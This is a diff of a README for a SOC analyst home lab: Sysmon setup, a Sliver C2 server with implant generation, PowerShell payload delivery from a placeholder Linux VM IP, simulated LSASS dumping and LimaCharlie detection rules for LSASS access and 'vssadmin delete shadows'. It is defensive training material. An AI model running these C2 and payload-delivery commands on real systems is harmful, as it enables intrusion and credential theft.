@@ -1,83 +1,179 @@
-# SOC-Analyst-Lab
+# SOC Analyst Home Lab
+
+![Status](https://img.shields.io/badge/status-complete-brightgreen?style=flat-square)
+![Platform](https://img.shields.io/badge/platform-VMware-blue?style=flat-square)
+![EDR](https://img.shields.io/badge/EDR-LimaCharlie-orange?style=flat-square)
+![C2](https://img.shields.io/badge/C2-Sliver-red?style=flat-square)
 
 ## Objective
 
-To simulate real-world SOC (Security Operations Center) scenarios and gain hands-on experience in detecting and responding to cyber threats. The primary focus was to ingest and analyze logs within an Endpoint Detection and Response (EDR) system, generating test telemetry to mimic real-world attack scenarios. This hands-on experience was designed to deepen my understanding of network security, attack patterns, and defensive strategies.
+Design and operate a self-contained virtual Security Operations Center (SOC) to simulate real-world adversary behavior end-to-end — from initial access through credential theft — and build automated detection and response logic in a production-grade EDR platform.
 
-### Skills Learned
+The lab follows [Eric Capuano's SOC Analyst guide](https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-part) and covers threat simulation, telemetry ingestion, custom detection rule authoring, YARA scanning, and ransomware TTP blocking.
 
-- Setting up a virtual SOC environment.
-- Configuring EDR agents and logging tools.
-- Simulating adversarial attacks (e.g., dumping LSASS).
-- Crafting detection and response rules.
-- Enhanced knowledge of network protocols and security vulnerabilities.
-- Automating malware detection and blocking ransomware activity.
-- Development of critical thinking and problem-solving skills in cybersecurity.
+---
 
-### Tools Used
-- VMware Workstation Pro: For setting up Linux and Windows virtual machines.
-- Sysmon: Provides detailed Windows telemetry.
-- Sliver C2: Command and Control server for testing adversarial scenarios.
-- LimaCharlie EDR: Endpoint Detection and Response for telemetry and automated rules.
+## Skills Developed
 
-## Steps
-After diving into a few blog posts on how to become a SOC analyst, I set up my own virtual lab, following the steps from Eric Capuano’s guide. It was quite the process but worth the effort for hands-on experience in cybersecurity.
+- Designing and configuring an isolated virtual lab environment
+- Deploying and tuning Sysmon for granular Windows telemetry
+- Operating a Command & Control (C2) framework (Sliver) for adversary simulation
+- Ingesting and analyzing endpoint telemetry in an EDR platform (LimaCharlie)
+- Authoring custom Detection & Response (D&R) rules based on observed TTPs
+- Writing YARA rules for file-based threat detection
+- Automating response actions (process termination, quarantine)
+- Mapping attack behavior to MITRE ATT&CK techniques
 
-# **1. Setting up the Lab Environment:**
-I started by setting up two virtual machines (VMs), one for Windows and another for Linux, using VMware. This is where I spent time configuring both, including setting static IPs and installing Sysmon on the Windows VM for granular logging (Sysmon really helps in detecting subtle activity). I disabled Windows Defender through the Group Policy Editor and registry tweaks to make sure nothing interfered with my attack scenarios. 
+---
 
-a. Download Sysmon with the following command.
-- [Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip]
+## Tools & Technologies
 
-b. Unzip Sysmon.zip
-- [Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon]
+| Tool | Role |
+|------|------|
+| **VMware Workstation Pro** | Hypervisor — hosts isolated Windows and Linux VMs |
+| **Sysmon** | Windows telemetry — process creation, network, file events |
+| **Sliver C2** | Adversary simulation — C2 implant generation and session management |
+| **LimaCharlie EDR** | Detection platform — telemetry ingestion, D&R rules, YARA scanning |
 
-c. Download SwiftOnSecurity’s Sysmon config.
-- [Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml]
+---
 
-d. Install Sysmon with Swift’s config.
-- [C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml]
+## Lab Architecture
 
-# **2. Command and Control (C2) Setup:**
-Next, I set up a Sliver Command and Control (C2) server on the Linux VM. Once it was running, I generated a C2 payload and executed it on the Windows VM via PowerShell. It was exciting when the session checked back into the Sliver server! At this point, I could execute commands on the target machine, including whoami and netstat to gather information about the compromised system.
+```
+┌─────────────────────────┐       ┌─────────────────────────┐
+│   Windows VM (Target)   │       │   Linux VM (Attacker)   │
+│                         │       │                         │
+│  - Sysmon installed     │◄─────►│  - Sliver C2 server     │
+│  - LimaCharlie agent    │  HTTP │  - Python HTTP server   │
+│  - Defender disabled    │       │  - Payload staging      │
+└─────────────────────────┘       └─────────────────────────┘
+           │
+           │ telemetry
+           ▼
+┌─────────────────────────┐
+│     LimaCharlie EDR     │
+│                         │
+│  - Event ingestion      │
+│  - D&R rule engine      │
+│  - YARA scanning        │
+└─────────────────────────┘
+```
 
-e. Run the following commands to download Sliver, a Command & Control (C2) framework by BishopFox. I recommend copy/pasting the entire block as there is line-wrapping occurring.
-- [# Download Sliver Linux server binary
-wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server
-#Make it executable
+---
+
+## Lab Phases
+
+### Phase 1 — Environment Setup
+
+Provisioned two isolated VMs in VMware Workstation Pro: a Windows target and a Linux attacker. Configured static IPs for reliable inter-VM communication, then deployed Sysmon on Windows using SwiftOnSecurity's hardened config for high-fidelity telemetry. Windows Defender was disabled via Group Policy and registry to allow unrestricted adversarial simulation.
+
+```powershell
+# Download and install Sysmon with SwiftOnSecurity config
+Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip
+Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon
+
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml `
+  -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml
+
+C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml
+```
+
+---
+
+### Phase 2 — C2 Infrastructure Deployment
+
+Installed and launched a Sliver C2 server on the Linux VM, generated an HTTP-based implant payload, and staged it using a temporary Python web server. The payload was delivered to the Windows target via PowerShell. Once executed, a live C2 session checked back into the Sliver server, enabling post-exploitation reconnaissance.
+
+```bash
+# Install Sliver C2 on Linux VM
+wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux \
+  -O /usr/local/bin/sliver-server
 chmod +x /usr/local/bin/sliver-server
-#install mingw-w64 for additional capabilities
-apt install -y mingw-w64]
+apt install -y mingw-w64
 
-f. Launch Sliver server
-- [sliver-server]
+# Launch server and generate implant
+sliver-server
+> generate --http [LINUX_VM_IP] --save /opt/sliver
+> implants
 
-g. Generate our first C2 session payload
-- [generate --http [Linux_VM_IP] --save /opt/sliver]
+# Stage payload over HTTP
+python3 -m http.server 80
+```
 
-h. Confirm the new implant configuration
-- [implants]
+```powershell
+# Deliver payload to Windows target
+IWR -Uri http://[LINUX_VM_IP]/[PAYLOAD].exe -Outfile C:\Users\User\Downloads\[PAYLOAD].exe
+```
 
-**To easily download the C2 payload from the Linux VM to the Windows VM, let’s use a little python trick that spins up a temporary web server.**
-- [python3 -m http.server 80]
+---
 
-i. Now run the following command to download your C2 payload from the Linux VM to the Windows VM, swapping your own Linux VM IP [Linux_VM_IP] and the name of the payload we generated in Sliver [payload_name] a few steps prior.
-- [IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe]
+### Phase 3 — Adversary Simulation & Detection
 
-# **3. Simulating Attacks:**
-I took it a step further by simulating adversarial activities like dumping the lsass.exe process, a common technique for stealing credentials. Using LimaCharlie’s EDR platform, I could see the related events in real-time and learned how to craft custom detection rules based on sensitive processes like lsass.exe. I even created a rule to trigger alerts for these actions and to block them in the future.
+Simulated credential theft by dumping the `lsass.exe` process — a core MITRE ATT&CK technique ([T1003.001 — LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)). Monitored the resulting telemetry in LimaCharlie in real time, identified the sensitive process access event, and authored a custom D&R rule to alert on future matches.
 
-# **4. Detection and Response Automation:**
-Once the basics were working, I moved on to automating detection using YARA rules and crafted response actions in LimaCharlie. For example, I set up a rule to scan newly downloaded .exe files and automatically alert or quarantine them if flagged. I also played with blocking shadow copy deletion commands (used by ransomware) by building detection logic that terminates the offending process.
+**Detection trigger:** Process accessing `lsass.exe` with suspicious access rights  
+**Response action:** Generate alert with process metadata and source path
 
-# **5. Reflection:**
-Setting this lab up was not only fun but really highlighted the workflow a SOC analyst would go through. The importance of detection tuning, understanding baseline behavior, and working with EDR platforms became clear. Now, I feel more confident exploring adversary techniques and crafting detections.
-After learning to detect attacks, I took things a step further by creating rules to block ransomware-like activities, such as the deletion of volume shadow copies. I built a custom Detection and Response (D&R) rule using LimaCharlie to identify and terminate the parent process whenever a command like vssadmin delete shadows /all is executed. By rerunning the attack and testing the rule, I was able to successfully block the process, further enhancing the defenses of my virtual SOC environment.
+---
 
-For anyone interested in SOC work, this series of blog posts is a great place to start!
+### Phase 4 — Automated Response & Ransomware Blocking
 
-If you're curious, you can follow the same steps through these blog links:
+Built YARA-based detection to flag newly dropped executables on the Windows VM. Then crafted a D&R rule targeting `vssadmin delete shadows /all` — a hallmark ransomware pre-encryption step used to destroy Volume Shadow Copies — configured to automatically terminate the parent process upon match.
 
-- <a href="https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-part">Part 1 </a>
-- <a href="https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-part-ea2">Part 2 </a>
-- <a href="https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-part-77e">Part 3 </a>
+**Detection trigger:** `vssadmin` invoked with `delete shadows /all` arguments  
+**Response action:** Terminate parent process immediately  
+**Validation:** Re-ran the attack; the process was killed automatically before completion
+
+---
+
+## Detection & Response Rules
+
+### LSASS Access Alert
+
+```yaml
+event: SENSITIVE_PROCESS_ACCESS
+op: ends with
+path: event/*/TARGET/FILE_PATH
+value: lsass.exe
+```
+
+**Response:** Generate alert with full process tree and access rights
+
+---
+
+### Ransomware — VSS Deletion Block
+
+```yaml
+event: NEW_PROCESS
+op: and
+rules:
+  - op: is
+    path: event/FILE_PATH
+    value: vssadmin.exe
+  - op: contains
+    path: event/COMMAND_LINE
+    value: delete shadows
+```
+
+**Response:** Terminate parent process
+
+---
+
+## Key Takeaways
+
+- Detection tuning matters — baselining normal behavior is essential before writing rules to avoid alert fatigue
+- EDR telemetry from Sysmon is far richer than default Windows event logs and dramatically improves detection fidelity
+- Automated D&R rules can block attacks in milliseconds — faster than any human response workflow
+- Simulating attacks yourself builds intuition for what malicious telemetry looks like vs. legitimate activity
+
+---
+
+## References
+
+- [Part 1 — Eric Capuano's SOC Analyst Guide](https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-part)
+- [Part 2](https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-part-ea2)
+- [Part 3](https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-part-77e)
+- [SwiftOnSecurity Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)
+- [Sliver C2 — BishopFox](https://github.com/BishopFox/sliver)
+- [LimaCharlie EDR](https://limacharlie.io)
+- [MITRE ATT&CK T1003.001](https://attack.mitre.org/techniques/T1003/001/)
